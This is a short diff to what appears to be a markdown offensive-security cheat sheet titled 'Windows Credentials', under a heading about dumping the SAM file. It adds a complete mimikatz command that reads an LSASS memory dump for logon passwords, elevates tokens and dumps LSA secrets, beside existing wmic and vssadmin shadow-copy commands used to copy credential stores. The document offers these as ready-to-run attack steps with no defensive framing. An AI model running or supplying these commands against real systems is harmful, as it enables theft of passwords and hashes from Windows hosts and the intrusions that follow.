@@ -1,6 +1,11 @@
 # Windows Credentials
 ## Local Windows Credentials
 ### Dump SAM FILE
+
+```
+C:\Windows\Tasks\mimikatz.exe "privilege::debug" "sekurlsa::minidump C:\Windows\Tasks\lsass.dmp" "sekurlsa::logonpasswords" "token::elevate" "lsadump::secrets" "token::elevate" "lsadump::lsa /patch" "exit"
+```
+
 ```
 wmic shadowcopy call create Volume='C:\'
 vssadmin list shadows
